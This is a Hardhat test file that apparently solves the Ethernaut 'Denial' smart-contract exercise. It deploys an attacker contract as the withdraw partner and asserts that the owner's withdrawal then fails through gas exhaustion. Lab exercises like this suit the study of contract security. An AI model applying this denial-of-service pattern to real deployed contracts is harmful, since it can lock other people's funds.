import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

const { provider, utils } = ethers;

describe('Denial', () => {
  let owner: SignerWithAddress;
  let user1: SignerWithAddress;
  let user2: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  before(async () => {
    [owner, user1, user2, attacker] = await ethers.getSigners();

    const Factory = await ethers.getContractFactory('Denial');
    contract = await Factory.connect(owner).deploy();
    await contract.deployed();

    let tx = await owner.sendTransaction({
      to: contract.address,
      value: utils.parseEther('0.001'),
    });
    await tx.wait();
  });

  it('attack', async () => {
    const AttackerFactory = await ethers.getContractFactory('DenialAttacker');
    const attackerContract = await AttackerFactory.deploy();
    await attackerContract.deployed();

    let tx = await contract.setWithdrawPartner(attackerContract.address);
    await tx.wait();

    tx = contract.connect(owner).withdraw({ gasLimit: 1000000 });
    await expect(tx).to.be.rejectedWith(Error);
  });
});
